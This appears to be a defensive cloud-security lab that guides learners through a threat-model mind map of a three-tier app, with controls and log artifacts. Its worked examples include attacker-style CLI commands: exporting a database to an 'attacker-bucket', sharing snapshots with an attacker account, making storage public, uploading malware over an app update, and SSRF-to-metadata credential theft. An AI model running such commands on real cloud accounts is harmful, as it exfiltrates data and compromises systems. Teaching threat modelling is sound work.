# Lab — Threat-Model Mind Map: 3-Tier App

> **Prereqs:** All 00‑Fundamentals lessons
> **Time:** 45–60 minutes
> **Authorization scope:** Paper/spreadsheet exercise. No deployment or offensive action needed.

## Goal

Build a one-page threat-model mind map for the canonical 3-tier app used across this curriculum. For every node, identify one CIA threat, one attacker action (all four lenses), and one control. This is a paper/spreadsheet/diagram exercise — no deployment needed.

## The canonical 3-tier app

```
                         ┌──────────────────┐
                         │   End User (web) │
                         └────────┬─────────┘
                                  │ HTTPS
                         ┌────────▼─────────┐
                         │  Load Balancer   │  ← Tier 1: entry point
                         └────────┬─────────┘
                                  │ HTTP
                         ┌────────▼─────────┐
                         │  App Server(s)   │  ← Tier 2: compute
                         │  (containers)    │
                         └───┬──────────┬───┘
                             │          │
                    ┌────────▼──┐  ┌───▼──────────┐
                    │  Database │  │ Object Store  │  ← Tier 3: persistence
                    └───────────┘  └──────────────┘
```

Each tier maps to different services per cloud:

| Tier | OnPrem | AWS | Azure | GCP |
|------|--------|-----|-------|-----|
| Load Balancer | F5 / HAProxy / Nginx | ALB (Application Load Balancer) | Application Gateway, Load Balancer | Cloud Load Balancing (HTTPS LB) |
| App Server | VM or Docker host | ECS Fargate / EC2 | Container Instances / AKS | Cloud Run / GKE |
| Database | PostgreSQL / MySQL on bare metal | RDS (PostgreSQL/MySQL) | Azure SQL / PostgreSQL Flexible | Cloud SQL |
| Object Store | NFS / NAS / MinIO | S3 | Blob Storage | Cloud Storage |

## Instructions

### Step 1: Draw the mind map

Start with the 3-tier diagram above at the center. For each of the 4 nodes (LB, App, DB, Object Store), create a branch with:

```
<node>
├── CIA Threat: <one>
├── Attacker Action (OnPrem): <one>
├── Attacker Action (AWS): <one>
├── Attacker Action (Azure): <one>
├── Attacker Action (GCP): <one>
└── Control: <one>
```

### Step 2: Fill it in using the lessons

Here is a worked example for the **Load Balancer** node:

```
Load Balancer
├── CIA Threat: Availability — DDoS or misconfig makes LB unreachable
├── Attacker Action (OnPrem): SYN flood at HAProxy; overwhelms NIC queue
├── Attacker Action (AWS): Delete ALB listener rule via compromised IAM role
├── Attacker Action (Azure): Modify NSG to deny all inbound on port 443
├── Attacker Action (GCP): Delete forwarding rule on HTTPS load balancer
└── Control: IAM least privilege (no DeleteListener/DeleteForwardingRule), Shield/Cloud Armor for DDoS, CloudTrail alert on deletion events
```

Complete the remaining three nodes. Below are guided hints:

**App Server node** — think about how attackers gain code execution on compute:

```
App Server
├── CIA Threat: Integrity — attacker modifies running application code or OS
├── Attacker Action (OnPrem): SSH brute-force → install cryptominer on bare-metal host
├── Attacker Action (AWS): SSRF → IMDSv1 creds → `ssm:SendCommand` to app instance → run crypto payload
├── Attacker Action (Azure): `az vm run-command invoke` on app server VM; inject backdoor via custom script extension
├── Attacker Action (GCP): `gcloud compute ssh` into app server instance; modify running workload
└── Control: Enforce IMDSv2; use signed container images; apply SCP denying `iam:PassRole` outside CI pipeline; OS-level `auditd` / Azure Monitor / Cloud Logging for exec events
```

**Database node:**

```
Database
├── CIA Threat: Confidentiality — attacker reads sensitive customer data
├── Attacker Action (OnPrem): `pg_dump` via compromised app server SSH tunnel
├── Attacker Action (AWS): `aws rds create-db-snapshot --db-instance-identifier prod-db` + share snapshot with attacker account
├── Attacker Action (Azure): Export Azure SQL DB bacpac to attacker-controlled storage account
├── Attacker Action (GCP): `gcloud sql export sql prod-db gs://attacker-bucket/dump.sql` via compromised SA
└── Control: Deny `rds:CreateDBSnapshot` / `rds:ModifyDBSnapshotAttribute` except backup role; storage firewall on export destination; CloudTrail alert on snapshot-sharing; MFA-delete on production snapshots
```

**Object Store node:**

```
Object Store
├── CIA Threat: Confidentiality + Integrity — data exposed or tampered
├── Attacker Action (OnPrem): Mount NFS export with `no_root_squash`; read/write all files
├── Attacker Action (AWS): `aws s3api put-bucket-acl --bucket prod-assets --acl public-read`; or `aws s3 cp malware.zip s3://prod-assets/app/update.zip`
├── Attacker Action (Azure): `az storage container set-permission --name prod-assets --public-access blob`
├── Attacker Action (GCP): `gcloud storage buckets add-iam-policy-binding gs://prod-assets --member=allUsers --role=roles/storage.objectViewer`
└── Control: SCP `s3:PutPublicAccessBlock` at org level; Azure Policy deny public blob access; GCP Org Policy `storage.publicAccessPrevention=Enforced`; S3 versioning + MFA-delete; account-level public access block
```

### Step 3: Identify the biggest gap

Look at the four nodes. Which one has the weakest control in your current environment? Mark it as your #1 hardening priority.

### Step 4: Cross-cloud translation check

Pick one attacker action from the AWS column. Translate it into Azure and GCP commands. Example:

| AWS action | Azure equivalent | GCP equivalent |
|------------|-----------------|----------------|
| `aws s3api put-bucket-acl --acl public-read` | `az storage container set-permission --public-access blob` | `gcloud storage buckets add-iam-policy-binding --member=allUsers --role=roles/storage.objectViewer` |

Do this for at least 3 rows.

## 🔴 Red Team view

The attacker actions in each node above represent the Red Team perspective. Key takeaways:

- **Same weakness, different language:** The same misconfiguration class appears in all three clouds. A public-storage vulnerability in AWS is `PutBucketAcl: public-read`; in Azure it's `--public-access blob`; in GCP it's `add-iam-policy-binding --member=allUsers`.
- **Chaining is universal:** SSRF → IMDS → credential theft works on EC2 (169.254.169.254), Azure (169.254.169.254 with `Metadata: true` header), and GCP (metadata.google.internal with `Metadata-Flavor: Google` header).
- **Blast radius determines damage:** A single over-privileged role in the app tier can lead to DB exfiltration + object store poisoning. The attacker doesn't need separate exploits — just excessive IAM.

**Artifacts from attacker actions in this lab:**
- AWS: CloudTrail `CreateDBSnapshot`, `PutBucketAcl`, `SendCommand`; VPC Flow Logs to 169.254.169.254
- Azure: Activity Log `Microsoft.Compute/virtualMachines/runCommand/action`, storage write events
- GCP: Cloud Audit Logs `storage.buckets.setIamPolicy`, `sql.instances.export`

## 🔵 Blue Team view

Every control listed in the mind map maps to a Blue Team defense strategy:

| Control category | AWS implementation | Azure implementation | GCP implementation |
|-----------------|-------------------|---------------------|-------------------|
| Least privilege IAM | SCP + IAM Access Analyzer + permission boundaries | Azure Policy + RBAC + PIM | Org Policy + IAM Conditions + Recommender |
| IMDS hardening | `HttpTokens=required`, hop-limit=1 | Disable IMDS on VMs where not needed; use Managed Identity | Shielded VMs; disable metadata server access |
| Storage public-prevention | S3 Block Public Access (account-level) | Storage account `--allow-blob-public-access false` + Azure Policy | `publicAccessPrevention=Enforced` Org Policy |
| Immutable artifacts | Image Builder + AMI signing | Image Builder + managed image | Binary Authorization + signed container images |
| Deletion protection | MFA-delete on S3, RDS deletion protection | Resource locks (CanNotDelete) | `deletionProtection` flag on Cloud SQL, bucket versioning |
| Logging & alerting | CloudTrail + GuardDuty + CloudWatch Alarms | Activity Log + Defender for Cloud + Sentinel | Cloud Audit Logs + Event Threat Detection + Cloud Monitoring |

## Deliverable

A single page (PDF, PNG, or draw.io) containing:
1. The 3-tier diagram at center.
2. Four branches (LB, App, DB, Object Store) with CIA threat, attacker actions (all 4 lenses), and control.
3. One gap highlighted.
4. Cross-cloud translation table (3 rows minimum).

## Example mind map structure (ASCII)

```
                          ┌─────────────────────────────────┐
                          │         3-TIER APP               │
                          │   LB → App (container) → DB + OS │
                          └─────────────────────────────────┘
                                         │
         ┌───────────────────────────────┼───────────────────────────────┐
         │                               │                               │
   ┌─────▼─────┐                   ┌─────▼─────┐                   ┌─────▼─────┐
   │    LB     │                   │    APP    │                   │    DB     │
   │ CIA: Avail│                   │ CIA: Integ│                   │ CIA: Conf │
   │           │                   │           │                   │           │
   │ OnPrem: ──│                   │ OnPrem: ──│                   │ OnPrem: ──│
   │ AWS: ──── │                   │ AWS: ──── │                   │ AWS: ──── │
   │ Azure: ── │                   │ Azure: ── │                   │ Azure: ── │
   │ GCP: ──── │                   │ GCP: ──── │                   │ GCP: ──── │
   │           │                   │           │                   │           │
   │ Control:  │                   │ Control:  │                   │ Control:  │
   └───────────┘                   └───────────┘                   └───────────┘
                                                                ┌─────▼─────┐
                                                                │ OBJ STORE │
                                                                │ CIA: Conf+│
                                                                │           │
                                                                │ OnPrem: ──│
                                                                │ AWS: ──── │
                                                                │ Azure: ── │
                                                                │ GCP: ──── │
                                                                │           │
                                                                │ Control:  │
                                                                └───────────┘
```

## Teardown

No teardown — this is a paper exercise.

## References
- STRIDE threat modeling: https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats
- OWASP Threat Modeling: https://owasp.org/www-community/Threat_Modeling
- [../shared-responsibility.md](../shared-responsibility.md)
- [../cia-triad-in-cloud.md](../cia-triad-in-cloud.md)
- [../kill-chain-attack-mapping.md](../kill-chain-attack-mapping.md)
